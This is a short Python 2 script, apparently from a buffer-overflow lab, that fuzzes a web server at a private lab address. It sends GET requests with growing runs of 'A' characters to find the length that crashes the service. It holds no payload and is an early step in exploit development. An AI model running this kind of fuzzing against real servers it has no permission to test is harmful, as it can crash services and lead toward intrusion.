#!/usr/bin/env python
import socket

for n in range (0, 500, 50):
	print "String lenght: " + str(n) 
	buff =  "GET /" + "\x41" * n + " HTTP/1.0\r\n\r\n" 
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(("192.168.127.130",8080))
	s.send(buff)
	print s.recv(1024)
	s.close()
